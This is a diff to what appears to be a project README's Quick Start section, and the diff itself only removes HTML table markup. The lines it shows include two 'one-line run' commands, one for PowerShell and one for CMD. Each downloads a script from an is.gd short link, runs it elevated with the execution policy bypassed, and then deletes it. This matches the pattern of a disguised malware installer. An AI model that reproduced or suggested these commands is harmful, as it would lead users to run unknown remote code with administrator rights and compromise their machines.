@@ -17,9 +17,7 @@
 
 ## 🎯 Quick Start
 
-<table>
-<tr>
-<td width="50%">
+
 
 ### 🏃‍♂️ One-Line Run
 
@@ -27,8 +25,6 @@
 iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "$env:TEMP\sqd5.ps1"; Start-Process "powershell.exe" -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "$env:TEMP\sqd5.ps1" -Verb RunAs -Wait; Remove-Item "$env:TEMP\sqd5.ps1" -ErrorAction SilentlyContinue
 ```
 
-</td>
-<td width="50%">
 
 ### 📱 CMD Version
 
@@ -36,9 +32,7 @@ iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "$env:TEMP\sqd5.ps1"; Start-
 powershell -Command "iwr -UseBasicParsing 'https://is.gd/sqd51' -OutFile '$env:TEMP\sqd5.ps1'; Start-Process 'powershell.exe' -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', '$env:TEMP\sqd5.ps1' -Verb RunAs -Wait; Remove-Item '$env:TEMP\sqd5.ps1' -ErrorAction SilentlyContinue"
 ```
 
-</td>
-</tr>
-</table>
+
 
 <div align="center">
 <img src="https://user-images.githubusercontent.com/74038190/212257472-08e52665-c503-4bd9-aa20-f5a4dae769b5.gif" width="100">
